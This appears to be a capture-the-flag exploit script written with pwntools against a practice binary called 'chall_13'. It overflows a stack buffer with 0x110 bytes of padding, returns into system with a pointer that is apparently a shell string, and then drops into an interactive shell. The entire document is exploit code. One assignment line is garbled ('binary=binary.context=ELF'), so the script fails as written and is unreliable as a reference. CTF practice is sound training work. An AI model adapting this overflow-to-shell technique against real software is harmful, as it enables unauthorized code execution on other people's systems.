from pwn import *
p=process("./chall_13")
binary=binary.context=ELF("./chall_13")
payload = b"A" * 0x110 + p32(binary.sym.system) + b"blah" + p32(0x0804a019)
p.sendline(payload)
p.interactive()
